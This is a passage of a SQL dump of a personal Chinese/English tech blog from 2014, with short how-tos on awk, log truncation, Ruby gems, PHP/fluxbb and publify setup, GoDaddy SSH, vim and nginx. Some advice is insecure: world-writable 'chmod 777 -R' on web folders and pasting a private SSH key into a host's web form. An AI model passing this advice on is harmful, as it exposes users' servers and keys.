target=\"_blank\">http://open.weixin.qq.com/</a>) 例如：  Android上手指南\r\n手把手教你在Android上创建一个与微信通信的APP </p>\r\n<p>2. 我们暂时申请个 订阅号吧（个人用户）。 &#160;看看这东西是干嘛的。 注册过程略. 时间大约半天。</p>\r\n<p>3. 最后，我们要成为开发者， 需要你上传一个头像，并且指定自己的活动区域。 过程略。</p>\r\n\r\n',0,'2014-01-21 08:48:00','2014-01-21 09:54:04','2014-01-21 09:54:04',1,NULL,'how-to-become-a-weixin-mp-developer','','','',573,'how-to-become-a-weixin-mp-developer'),(183,'找出 某些command 的PID  (using awk find all the pids ) ','\r\n<p>今天，沛沛交给我一招： awk. 找出所有的pid 列表。   ps -ef|grep fetcher |awk \'{print $2}\' &#160;</p>\r\n<p>例如：</p>\r\n<pre>$ ps -ef | grep fetcher\r\nroot     22980 22967  5 17:41 ?        00:01:45 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\nroot     23041     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;&amp; god start fetcher\r\nroot     23046 23041  0 17:41 ?        00:00:15 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\nroot     23070     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;&amp; god start fetcher\r\nroot     23072 23070  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\nroot     23143     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;&amp; god start fetcher\r\nroot     23152 23143  0 17:41 ?        00:00:15 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\nroot     23173     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;&amp; god start fetcher\r\nroot     23190 23173  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\nroot     23245     1  0 17:41 ?        00:00:00 sh -c god stop fetcher &amp;&amp; god start fetcher\r\nroot     23256 23245  0 17:41 ?        00:00:16 /root/.rbenv/versions/1.9.3-p327/bin/ruby /root/.rbenv/versions/1.9.3-p327/bin/god stop fetcher\r\n\r\n</pre>\r\n<p>使用了awk后：</p>\r\n<pre>$ ps -ef|grep fetcher |awk \'{print $2}\'  \r\n23941\r\n23942\r\n23946\r\n23951\r\n23969\r\n24000\r\n24005\r\n24009\r\n24011\r\n24023\r\n24028\r\n24043\r\n24046\r\n24089\r\n24104\r\n24121\r\n\r\n</pre>\r\n\r\n',0,'2014-01-21 10:19:00','2014-01-21 10:23:48','2014-01-21 10:23:48',1,NULL,'using-awk-find-all-pids-only','','','',381,'using-awk-find-all-pids-only'),(184,'如何处理服务器上的大日志文件(how to deal with huge log file in production environment?)','<p>答案：使用 echo. 不要使用 rm &#160;(short answer: &#160;use \'echo\' but not \'rm\' )</p>\r\n<p>$ echo \'\' &gt; huge_file.log &#160;</p>\r\n<p>原因： &#160;运行中的系统，会有一个process一直在写入这个日志文件。如果简单的删掉的话，磁盘空间不会释放。除非把这个process也干掉。 而使用echo 的话，会把这个文件的内容清空，非常安全有效。 可以做到空间的实时释放（每秒大约1G） &#160; ( explaination: &#160;the huge log file is always written by some PROCESS. The disk space is not freed if we simplely remove this huge file until the PROCESS is terminated. However, the echo command will clear the file\'s content and free the disk space in real-time. (about 1G/s ) )</p>\r\n<p>refer to : <a target=\"_blank\" href=\"http://stackoverflow.com/questions/332629/rm-not-freeing-diskspace\">http://stackoverflow.com/questions/332629/rm-not-freeing-diskspace</a>&#160; &#160;and thanks to : &#160;jiejie, our Operation Master!&#160;</p>',0,'2014-01-22 01:24:00','2014-01-22 01:31:24','2014-01-22 01:31:24',1,NULL,'how-to-deal-with-huge-log-file-in-production','','','',651,'how-to-deal-with-huge-log-file-in-production'),(185,'几个比较好用的在线绘图网站（several good diagram&mockup online tools)','<p>关键是： 上手简单， 可以随时保存成 pdf, jpg等。 &#160;(the key is: easy to use and save as jpg/xml/pdf)&#160;</p>\r\n<p>1. <a href=\"gliffy.com\" target=\"_blank\">gliffy.com</a>&#160; 有非常丰富的图片库。（关键要用左下角的\'more shapes\'，然后选择各种你想要的） &#160;( pay attention to the \'more shapes\' in the left bottom corner of the page)&#160;</p>\r\n<p>2. <a href=\"https://moqups.com/\" target=\"_blank\">https://moqups.com/</a>&#160; 很专业的mockup 图 &#160;(very professional mockups)&#160;</p>',0,'2014-01-22 02:00:00','2014-01-22 02:11:13','2014-01-22 02:11:13',1,NULL,'good-diagram-mockup-online-tools','','','',512,'good-diagram-mockup-online-tools'),(186,'jeweler上手初体验（create your rubygem using jeweler) ','<p>传统的gem的建立方式很繁琐， 需要手动控制版本啊，依赖啊。(the problems that creating a rubygem using the official way are: &#160;not very easy to control the version(minor, major, path), and dependencies. &#160;so we use jeweler)</p>\r\n<p>steps:</p>\r\n<p>1. $ gem install jeweler</p>\r\n<p>2. $ rbenv rehash</p>\r\n<p>3. $ jeweler auditable_controller</p>\r\n<p>4. 发现jeweler 都帮你用git 做了提交了( jeweler helps you commited the code) </p>\r\n<pre>	create	.gitignore\r\n	create	Rakefile\r\n	create	Gemfile\r\n	create	LICENSE.txt\r\n	create	README.rdoc\r\n	create	.document\r\n	create	lib\r\n	create	lib/auditable_controller.rb\r\n	create	test\r\n	create	test/helper.rb\r\n	create	test/test_auditable_controller.rb\r\n       Jeweler has prepared your gem in ./auditable_controller\r\n</pre>\r\n<p>5. 修改Gem, 使用 gem \"simplecov\" &#160;(use simplecov instead of rcov in Gemfile)&#160;</p>\r\n<pre># Gemfile\r\ngroup :development do\r\n  gem \"shoulda\", \"&gt;= 0\"\r\n  gem \"rdoc\", \"~&gt; 3.12\"\r\n  gem \"bundler\", \"~&gt; 1.0\"\r\n  gem \"jeweler\", \"~&gt; 2.0.0\"\r\n  gem \"simplecov\"   # don\'t use gem \'rcov\' if you are using Ruby 1.9\r\nend\r\n</pre>\r\n<p>6. bundle install&#160;</p>\r\n<p>7. 修改RakeFile&#160; (remove the rcov code segment from Rakefile) </p>\r\n<pre> 35 #require \'rcov/rcovtask\'\r\n 36 #Rcov::RcovTask.new do |test|\r\n 37 #  test.libs &lt;&lt; \'test\'\r\n 38 #  test.pattern = \'test/**/test_*.rb\'\r\n 39 #  test.verbose = true\r\n 40 #  test.rcov_opts &lt;&lt; \'--exclude \"gems/*\"\'\r\n 41 #end\r\n\r\n</pre>\r\n<p>8. create your gem\'s version:&#160;</p>\r\n<pre>$ rake version:write MAJOR=1 MINOR=0 PATCH=1\r\nUpdated version: 1.0.1\r\n</pre>',0,'2014-01-22 07:11:00','2014-01-22 07:15:06','2014-01-22 07:51:07',1,NULL,'create-your-rubygem-using-jeweler','','','',376,'create-your-rubygem-using-jeweler'),(187,'publify的安装过程(setup publify as your blog system)','<p>真的是非常简单，不过比官方多了两步。(it\'s really simple however you need to run the database related tasks manually yourself.</p>\r\n<p>1. $ git clone https://github.com/fdv/publify.git</p>\r\n<p>2. $ cp config/database.yml.mysql config/database.yml</p>\r\n<p>3. $ bundle install </p>\r\n<p>4. $ bundle exec rake db:create </p>\r\n<p>5. $ bundle exec rake db:migrate</p>\r\n<p>6. $ bundle exec rake db:seed<br /> </p>\r\n<p>安装结束后，设置好用户名和密码就可以开始了～  <a href=\"http://yuqiong.me\" target=\"_blank\"></a>\r\n</p>\r\n<p><a href=\"http://yuqiong.me\" target=\"_blank\">张誉琼的个人网站</a>\r\n</p>',0,'2014-01-22 23:10:00','2014-01-22 23:14:55','2014-01-23 23:26:10',1,NULL,'setup-publify-as-your-blog-system','','','',599,'setup-publify-as-your-blog-system'),(188,'如何贡献你的代码？(how to contribe to open source projects)','<p>contribe your code， 挥一挥衣袖, &#160;深藏功与名。。。</p>\r\n<p>1. fork the project on github.</p>\r\n<p>2. edit</p>\r\n<p>3. commit &amp; push</p>\r\n<p>4. send a pull request.&#160;</p>\r\n<p>e.g. 我想为 publify 这个项目增加汉化文件。就：</p>\r\n<p>1. fork the project.</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yNC8wOV8xMF8zNV8zNDNfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjRfMDZfNTlfMjgucG5nBjoGRVQ/Screenshot%20from%202014-01-24%2006png:28.:ext\" title=\"Screenshot From 2014 01 24 06:59:28\" alt=\"Screenshot From 2014 01 24 06:59:28\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI0MjAxNC8wMS8yNC8wOV8xMF8zNV8xNl9uZXdseV9mb3JrZWRfcHJvamVjdC5wbmcGOgZFVA/newly_forked_project.png\" title=\"Newly Forked Project\" alt=\"Newly Forked Project\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>2. clone it:</p>\r\n<pre>siwei@siwei-Lenovo-V470c:/workspace$ git clone https://github.com/sg552/publify.git\r\nCloning into \'publify\'...\r\nremote: Reusing existing pack: 54092, done.\r\nremote: Counting objects: 2, done.\r\nremote: Compressing objects: 100% (2/2), done.\r\nremote: Total 54094 (delta 1), reused 0 (delta 0)\r\nReceiving objects: 100% (54094/54094), 22.76 MiB | 1.01 MiB/s, done.\r\nResolving deltas: 100% (35321/35321), done.\r\n</pre>\r\n<p>3. edit, commit, push...&#160;</p>\r\n<p>4. send pull request ( from the origin git repo)</p>\r\n<p>4.1 find the button here:&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI6MjAxNC8wMS8yOS8wNl8xN180NV83NDNfY3JlYXRlX3B1bGxfcmVxdWVzdF9zdGVwMS5wbmcGOgZFVA/create_pull_request_step1.png\" title=\"Create Pull Request Step1\" alt=\"Create Pull Request Step1\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>4.2 submit this form:&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wNl8xN180NV85OTlfY3JlYXRlX3B1bGxfcmVxdWVzdF9zdGVwMl9maWxsX2Zvcm0ucG5nBjoGRVQ/create_pull_request_step2_fill_form.png\" title=\"Create Pull Request Step2 Fill Form\" alt=\"Create Pull Request Step2 Fill Form\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>5. wait your commits to be merged. &#160; &#160;</p>\r\n<p>origin page : <a href=\"https://github.com/fdv/publify/pull/351\" target=\"_blank\">https://github.com/fdv/publify/pull/351</a>\r\n</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wNl8xNF8zM18zMjhfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjlfMDZfMDdfMzIucG5nBjoGRVQ/Screenshot%20from%202014-01-29%2006png:32.:ext\" title=\"Screenshot From 2014 01 29 06:07:32\" alt=\"Screenshot From 2014 01 29 06:07:32\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>',0,'2014-01-23 22:25:00','2014-01-23 23:02:26','2014-02-03 08:57:52',1,NULL,'how-to-contribute-to-opensource-projects','','','',543,'how-to-contribute-to-opensource-projects'),(189,'ruby中最牛找方法定义的办法。(the strongest way to find where a ruby method defined)','<p>\r\n让这个方法出错，然后在backtrace中就可以找到它是在哪里定义的了 ^_^  ( make error on this method on purpose, e.g. pass incorrect parameters, and you will see where it is defined )\r\n</p>\r\n<p>\r\nrefer to: <a href=\"http://stackoverflow.com/questions/13514597/where-does-the-underscore-syntax-in-typo-erb-files-come-from\">http://stackoverflow.com/questions/13514597/where-does-the-underscore-syntax-in-typo-erb-files-come-from</a>\r\n</p>',0,'2014-01-25 00:28:00','2014-01-25 00:45:19','2014-01-25 00:45:19',1,NULL,'the-best-way-to-find-where-method-is-defined','','','',397,'the-best-way-to-find-where-method-is-defined'),(190,'设置PHP的开发环境（setup php environment in ubuntu)','<p>前些日子搭建了一个 自我康复网的论坛(ziwokangfu.com) ，使用的是fluxbb( php forum)，发现被注册机注册了很多用户，发表了很多的垃圾帖子。实在不能忍了，哥要给它加上验证码～</p>\r\n<p>开了一下PHP， 它跟JSP好像啊！ &#160;HTML页面里嵌套 php代码。不错，上手很快（但是不用框架的话很快就要失去控制了，这个不谈）</p>\r\n<p>所以先下载fluxbb的源代码。<br />$ git clone https://github.com/fluxbb/fluxbb.git</p>\r\n<p>然后搭建PHP开发环境。\r\n</p>\r\n<pre>  $ sudo apt-get install apache2 php5 php5-mysql (php5-fpm)\r\n</pre>\r\n<p>如果你安装了nginx, 就要记得不要与 apache的端口相冲突。 然后 进入到root path (/var/www) ，编辑文件： hello.php:&#160;</p>\r\n<pre>&lt;?php echo \'Hello, World! This is my first php page~\'; ?&gt;\r\n</pre>\r\n<p>访问 localhost:6060</p> <img src=\"/system/images/BAhbBlsHOgZmSSIqMjAxNC8wMS8yNy8xNF8zN18xMl82MTFfZmlyc3RfcGhwLnBuZwY6BkVU/first_php.png\" title=\"First Php\" alt=\"First Php\" rel=\"225x255\" width=\"375\" height=\"138\" />\r\n',0,'2014-01-27 02:02:00','2014-01-27 02:06:13','2014-02-28 10:12:57',1,NULL,'setup-php-environment-in-ubuntu','','','',521,'setup-php-environment-in-ubuntu'),(191,'learn x in y minutes','<p>今天抱着学习PHP的心态，发现了这个有意思的站点： <a target=\"_blank\" href=\"http://learnxinyminutes.com/docs/php/\">http://learnxinyminutes.com/docs/php/</a>&#160; (today I found this interesting website: )&#160;</p>\r\n<p>非常棒，跟我之前想到的3分钟学习一种新技术 非常接近。 &#160;(it\'s so great that I had the same idea....)</p>\r\n<p>希望它们越做越好。 欢迎贡献代码：  <a target=\"_blank\" href=\"https://github.com/adambard/learnxinyminutes-docs\">https://github.com/adambard/learnxinyminutes-docs</a>&#160;(welcome to contribute your code here)&#160;</p>',0,'2014-01-27 03:02:00','2014-01-27 03:05:03','2014-01-27 03:05:03',1,NULL,'learn-x-in-y-minutes','','','',538,'learn-x-in-y-minutes'),(192,'配置fluxbb的开发环境( setup and run fluxbb in ubuntu )','<p>最近被fluxbb的注册机弄得头大，所以必须要加上个验证码了。 &#160;(these days I have been borned by the spams on my fluxbb forum. It\'s time for me to create something like \'validation code\' to fluxbb)</p>\r\n<p>步骤：</p>\r\n<p>1. 设置PHP的环境（apache + php + mysql. ) 见前一篇文章。  ( refer there my previous post to know how to <a href=\"http://siwei.me/blog/posts/setup-php-environment-in-ubuntu\" target=\"_blank\">seup fluxbb environment</a> )&#160;</p>\r\n<p>2. fork <a href=\"https://github.com/fluxbb/fluxbb\" target=\"_blank\">fluxbb on github </a>: </p>\r\n<p>3. clone your forked code and then config your apache file, restart apache : \r\n</p>\r\n<pre>  \r\n&lt; VirtualHost *:6060&gt;\r\n  ServerAdmin webmaster@localhost\r\n  DocumentRoot /sg552/workspace/fluxbb\r\n  .....\r\n\r\n</pre>\r\n<pre>$ sudo /etc/init.d/apache2 restart\r\n</pre>\r\n\r\n<p> 4. 打开： localhost:6060, 然后根据它的提示，把一些文件夹的权限加上： open \'localhost:6060\' and then follow its instructions:  </p>\r\n<pre>$ chmod 777 -R cache/ \r\n$ chmod 777 -R img/avatars/\r\n</pre>\r\n<p> 5. 建立mysql 数据库 &#160;(create mysql database)&#160;</p>\r\n<pre>$ mysql -u root \r\n&gt; create database fluxbb\r\n</pre>\r\n<p>6. 按照提示下载这个文件，并且把它加到fluxbb的目录下（ download and move this config.php file to your root of fluxbb folder)&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI3MjAxNC8wMS8yNy8xNV8wN18zMF8xMV9mbHV4YmJfZmluYWxpemVfaW5zdGFsbC5wbmcGOgZFVA/fluxbb-finalize-install.png\" title=\"Fluxbb Finalize Install\" alt=\"Fluxbb Finalize Install\" rel=\"225x255\" width=\"758\" height=\"443\" /></p>\r\n<p>大功告成！～ &#160; （ well done! )</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJDMjAxNC8wMS8yNy8xNV8wOF8xN18yMF9TY3JlZW5zaG90X2Zyb21fMjAxNF8wMV8yN18xNV8wN181OS5wbmcGOgZFVA/Screenshot%20from%202014-01-27%2015png:59.:ext\" title=\"Screenshot From 2014 01 27 15:07:59\" alt=\"Screenshot From 2014 01 27 15:07:59\" rel=\"225x255\" width=\"1280\" height=\"800\" /></p>',0,'2014-01-27 07:00:00','2014-01-27 07:09:13','2014-01-27 07:12:30',1,NULL,'setup-and-run-fluxbb-in-ubuntu','','','',1920,'setup-and-run-fluxbb-in-ubuntu'),(193,'如何管理godaddy host (how to manage godaddy host)','<p>前些日子在godaddy上买了个空间，放了一个论坛（ziwokangfu.com) 。并且加上了注册验证的功能。 现在要把代码放上去。</p>\r\n<p>步骤：</p>\r\n<p>1. 登录godaddy. (login to godaddy)&#160;\r\n</p>\r\n<p>2. 进入 web hosting &#160;(enter the web hosting area)&#160;\r\n</p>\r\n<p>3. control + F, 找到 \'ssh shell\'. &#160;(ctrl + f to find the \'ssh shell\' link, click it)\r\n</p>\r\n<p>4. 进入到了这个页面，把你的id_rsa 和 id_rsa.pub 分别粘贴进去，保存。 &#160;(generate , copy &amp; paste your private, public keys )\r\n</p>\r\n<p>4.1 &#160;click \'import key\' button. ( if you are like me that already have a ssh key generated)&#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSI9MjAxNC8wMS8yOS8wNl80MF8yMV8yODBfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwMS5wbmcGOgZFVA/godaddy_manage_ssh_key_step1.png\" title=\"Godaddy Manage Ssh Key Step1\" alt=\"Godaddy Manage Ssh Key Step1\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>4.2 fill this form. &#160;the private key == id_rsa, &#160;the public key == id_rsa.pub (in your ~/.ssh folder)&#160;<img src=\"/system/images/BAhbBlsHOgZmSSJRMjAxNC8wMS8yOS8wNl80MF8yMV81MjlfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwMl9wYXN0ZV95b3VyX3NzaF9rZXlzLnBuZwY6BkVU/godaddy_manage_ssh_key_step2_paste_your_ssh_keys.png\" title=\"Godaddy Manage Ssh Key Step2 Paste Your Ssh Keys\" alt=\"Godaddy Manage Ssh Key Step2 Paste Your Ssh Keys\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>step3. make this ssh key enabled by clicking the number \'0\' . &#160;</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJBMjAxNC8wMS8yOS8wNl80N18zMV84M19nb2RhZGR5X21hbmFnZV9zc2hfa2V5X3N0ZXA0X2RvbmUucG5nBjoGRVQ/godaddy_manage_ssh_key_step4_done.png\" title=\"Godaddy Manage Ssh Key Step4 Done\" alt=\"Godaddy Manage Ssh Key Step4 Done\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJHMjAxNC8wMS8yOS8wNl80MF8yMV83NTRfZ29kYWRkeV9tYW5hZ2Vfc3NoX2tleV9zdGVwM19lbmFibGVfaXQucG5nBjoGRVQ/godaddy_manage_ssh_key_step3_enable_it.png\" title=\"Godaddy Manage Ssh Key Step3 Enable It\" alt=\"Godaddy Manage Ssh Key Step3 Enable It\" rel=\"225x255\" width=\"1366\" height=\"768\" /></p>\r\n<p>5. done. now login using your hostname:&#160;\r\n</p>\r\n<pre>siwei@siwei-Lenovo-V470c:/workspace/rails_girls_cn$ ssh ziwokangfu.com -l ziwokangfu\r\nAttempting to create directory /home/ziwokangfu/perl5\r\nziwokangfu@p3plcpnl0040 [~]$ pwd\r\n/home/ziwokangfu\r\nziwokangfu@p3plcpnl0040 [~]$ ls\r\n./            .appdata/             .bash_profile  .cl.selector/  cpbackup-exclude.conf  .htpasswds/  public_ftp/   ssl/     www@\r\n../           application_backups/  .bashrc        .contactemail  etc/                   mail/        public_html/  tmp/\r\naccess-logs@  .bash_logout          .cagefs/       .cpanel/       .gemrc                 perl5/       .ssh/         .trash/\r\n</pre>',0,'2014-01-28 22:32:00','2014-01-28 22:49:33','2014-01-28 22:49:33',1,NULL,'manage-godaddy-host','','','',557,'manage-godaddy-host'),(194,'在godaddy 主机上操作github项目。(work under github and godaddy host)','<p>如题。</p>\r\n<p>也基本上算是自己第一次写的PHP代码。 (this is my first PHP experience. )</p>\r\n<p>后来发现 fluxbb版本不吻合，于是自己的代码没办法直接merge过去。只好手动修改。发现居然可以直接在godaddy上操作 github的push/pull. 很给力。所以直接新建了一个项目。 ( however I found that the fluxbb versions don\'t match between godaddy.com and my github repo, and my commits could not be merged, I have to merge them manually. It\'s a surprise that we can do git operations on godaddy.com, oh yeah! so a new forum project was copied from godaddy to my github repo and it will be maintained in future more conveniently)&#160;</p>\r\n<p>1. $ ssh ziwokangfu.com</p>\r\n<p>2. $ cd forum&#160;</p>\r\n<p>3. $ git init . &#160;/ git commit</p>\r\n<p>4. create a new repo on github.&#160;</p>\r\n<p>5. add ziwokangfu.com\'s id_rsa.pub file to github.</p>\r\n<p>6. $ git push ....</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wMS8yOS8wN181N18zOF8zODlfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDFfMjlfMDdfNTZfNDYucG5nBjoGRVQ/Screenshot%20from%202014-01-29%2007png:46.:ext\" title=\"Screenshot From 2014 01 29 07:56:46\" alt=\"Screenshot From 2014 01 29 07:56:46\" rel=\"225x255\" width=\"1366\" height=\"768\" />&#160;</p>',0,'2014-01-28 23:52:00','2014-01-29 00:02:21','2014-01-29 00:02:21',1,NULL,'work-under-github-and-godaddy-host','','','',401,'work-under-github-and-godaddy-host'),(195,'VIM中的常见操作：  (common operations in VIM) ','<p> 如下，都是我常用的 </p> \r\n\r\n<pre>上下左右：  jkhl\r\n下一个单词：  w\r\n前一个单词：  b\r\n下一屏： ctrl + f \r\n上一屏 :  ctrl + b\r\n搜索some_string：    /some_string\r\n把全局的some_string 替换成 new_string :   %s/some_string/new_string/g\r\n继续搜索下一个：  n\r\n继续搜索前一个 :   N (shift + n)\r\n补全：    ctrl + n ,  ctrl + p  (next, previous的缩写)\r\n删掉一个字母：  x\r\n删掉一个单词：  dw\r\n删掉一行：   dd\r\n删掉3行：    3d\r\n复制一个单词：  yw\r\n复制当前行： yy\r\n粘贴： p\r\n选中N行：   shift + v , 再 jk\r\n快速打开一个文件：  ctrl + t\r\n快速打开前一个文件：  ctrl + e\r\n跳到文件头： gg\r\n跳到文件末尾： shift + g\r\n在光标前新增内容： i  (insert的缩写)\r\n在光标后新增内容： a (add的缩写）\r\n快速的跳到该行最后：  shift + 4\r\n快速的跳到该行最前：  0\r\n上一次编辑的地方：  g;\r\n下一次编辑的地方：  g,\r\n</pre>',0,'2014-01-29 05:59:00','2014-01-29 06:01:04','2014-01-29 06:02:29',1,NULL,'common-operations-in-vim','','','',432,'common-operations-in-vim'),(196,'接触一个新编辑器时，我最关心的几个功能： (the most important features that I care for a new editor) ','<p>1。快速打开： &#160; Eclipse 中是 ctrl + shift + r, &#160;VIM: &#160;ctrl + t, &#160;sublime: &#160;cmd + p</p>\r\n<p>2. 上一次打开的文件： &#160;Eclipse 中： ctrl + e &#160;, vim ctrl + e, sublime: &#160;无。 还是用cms+ p</p>\r\n<p>3. 查找和替换。 Eclipse: &#160;ctrl + shift + f, (似乎）, vim : &#160;Gsearch. &#160;sublime: 无。 &#160;貌似无快捷键。</p>\r\n<p>4. 跳到上一次的编辑位置： &#160;Eclipse: alt + left/right, &#160;vim: &#160;g; &#160;g, &#160; &#160; .sublime: &#160;ctrl+ z, ctrl + y</p>',0,'2014-01-29 06:01:00','2014-01-29 06:13:40','2014-01-29 06:13:40',1,NULL,'the-most-important-features-for-new-editor','','','',486,'the-most-important-features-for-new-editor'),(197,'LINUX 中的操作快捷键：   shortcuts in linux comandline','LINUX 中的操作快捷键：  \r\n<pre>全屏： F11  ( fullscreen) \r\n下一个标签：  ctrl + page_down  (next tab)\r\n上一个标签：  ctrl + page_up  (previous tab) \r\n第一个标签：  alt + 1  (first tab)\r\n最后一个标签： alt + 9  (last tab) \r\n快速打开 command line:  ctrl + alt + t  (new console)\r\n在command line 中新建标签页 ： ctrl + shift + t    (new tab)\r\n快速关闭当前cmd标签：  ctrl + shift + w   (close current tab)\r\n把当前的标签页前移或者后移： ctrl + shift + page_down/page_up  (move to next/previous)\r\n快速定位之前的操作:  ctrl + r   (reverse search previous command) \r\n切换到上一个窗口:  alt + tab    (switch to previous window) \r\n在command line的已经输入的命令中，快速的左右移动光标：  ctrl + left/right  (fast-move the cursor) \r\n</pre>',0,'2014-01-29 06:13:00','2014-01-29 06:16:17','2014-01-29 06:16:17',1,NULL,'shortcuts-in-linux-commandline','','','',423,'shortcuts-in-linux-commandline'),(198,'ubuntu中 .bash_profile 会使 .bashrc失效  (remove bash_profile if you want your bashrc take effect in ubuntu)','<p>过去一直发现自己的~/.bashrc 不会随着用户的登录而自动加载。今天无意当中发现 /root 目录下多了一个 ~/.bash_profile的文件。 size = 0. 我很好奇，于是把它删掉。重新登录，发现~/.bashrc 居然可以使用了乐乐乐乐乐 。。。。 我很开心：） &#160;(these days I had a problem while ssh-login to my VPS that the ~/.bashrc was not auto-loaded. &#160;just now after my login , I found there\'s a blank .bash_profile in my home folder. &#160;Delete it, logout, login, and .bashrc takes effect again~ )</p>\r\n<p>学习是王道啊，自己有时间的时候应该读些linux的基本资料。 &#160;( what if I had enough time..... &gt;_&lt;)&#160;</p>',0,'2014-01-30 07:49:00','2014-01-30 07:55:20','2014-01-30 07:55:20',1,NULL,'remove-bash-profile-if-you-want-bashrc-take-effect','','','',412,'remove-bash-profile-if-you-want-bashrc-take-effect'),(199,'nginx + thin 配置 nginx 提供 assets ( nginx + thin, config nginx server static assets)','<p>an example from railsgirlschina.com: </p>\r\n<p>(notice : &#160;root for location ~ ^/assets/ is : /opt/app/siwei/rails_girls_cn/shared; , \r\nbut not : /opt/app/siwei/rails_girls_cn/shared/assets \r\n</p>\r\n\r\n<pre>  server {\r\n          listen       80; \r\n          server_name  www.railsgirlschina.com railsgirlschina.com www.railsgirlsbeijing.com railsgirlsbeijing.com;\r\n          charset utf-8;\r\n          location / { \r\n              proxy_pass          http://rails_girls_site;\r\n              proxy_redirect      default;\r\n              proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\r\n              proxy_set_header    X-Real-IP $remote_addr;\r\n              proxy_set_header    Host $http_host;\r\n              proxy_next_upstream http_502 http_504 error timeout invalid_header;\r\n          }   \r\n          location ~ ^/assets/ {\r\n            root /opt/app/siwei/rails_girls_cn/shared;\r\n            expires 1y; \r\n            add_header Cache-Control public;\r\n            add_header ETag \"\"; \r\n            break;\r\n          }   \r\n  }\r\n  upstream rails_girls_site{\r\n    server localhost:3560;\r\n    server localhost:3561;\r\n  }\r\n\r\n</pre>',0,'2014-01-30 08:11:00','2014-01-30 08:13:32','2014-01-30 08:20:21',1,NULL,'config-nginx-serve-static-assets','','','',444,'config-nginx-serve-static-assets'),(200,'rails  gem的实现模式( implementation for rails gem)','<p>最典型的要数： devise.</p>\r\n<p>1. 初始化配置文件</p>\r\n<pre>$ bundle exec rails generate devise:install\r\n      create  config/initializers/devise.rb\r\n      create  config/locales/devise.en.yml\r\n\r\nSome setup you must do manually if you haven\'t yet:\r\n  1. Ensure you have defined default url options in your environments files. Here \r\n     is an example of default_url_options appropriate for a development environment \r\n     in config/environments/development.rb:\r\n       config.action_mailer.default_url_options = { :host =&gt; \'localhost:3000\' }\r\n     In production, :host should be set to the actual host of your application.\r\n\r\n  2. Ensure you have defined root_url to *something* in your config/routes.rb.\r\n     For example:\r\n       root :to =&gt; \"home#index\"\r\n\r\n  3. Ensure you have flash messages in app/views/layouts/application.html.erb.\r\n     For example:\r\n       &lt;p class=\"notice\"&gt;&lt;%= notice %&gt;&lt;/p&gt;\r\n       &lt;p class=\"alert\"&gt;&lt;%= alert %&gt;&lt;/p&gt;\r\n\r\n  4. If you are deploying on Heroku with Rails 3.2 only, you may want to set:\r\n       config.assets.initialize_on_precompile = false\r\n     On config/application.rb forcing your application to not access the DB\r\n     or load models when precompiling your assets.\r\n\r\n  5. You can copy Devise views (for customization) to your app by running:\r\n       rails g devise:views\r\n</pre>\r\n<p>2. generate model: </p>\r\n<pre>$ bundle exec rails generate devise user\r\n      invoke  active_record\r\n      create    db/migrate/20140130232140_devise_create_users.rb\r\n      create    app/models/user.rb\r\n      invoke    rspec\r\n      create      spec/models/user_spec.rb\r\n      invoke      factory_girl\r\n      create        spec/factories/users.rb\r\n      insert    app/models/user.rb\r\n       route  devise_for :users\r\n</pre>\r\n\r\n<p>3. its model: </p>\r\n<pre>class User &lt; ActiveRecord::Base\r\n  # Include default devise modules. Others available are:\r\n  # :token_authenticatable, :confirmable,\r\n  # :lockable, :timeoutable and :omniauthable\r\n  devise :database_authenticatable, :registerable,\r\n         :recoverable, :rememberable, :trackable, :validatable, :confirmable\r\nend\r\n</pre>',0,'2014-01-30 23:13:00','2014-01-30 23:27:12','2014-01-30 23:27:12',1,NULL,'implementation-for-rails-gem','','','',387,'implementation-for-rails-gem'),(201,'Rails3/4中使用 bootstrap3 的图标（display bootstrap3 plyphicons in Rails3/4）','<p> refer to: <a href=\"http://www.erikminkel.com/2013/09/01/twitter-bootstrap-3-in-a-rails-4-application/\" target=\"_blank\">http://www.erikminkel.com/2013/09/01/twitter-bootstrap-3-in-a-rails-4-application/</a>\r\n</p>\r\n\r\n<p> bootstrap3 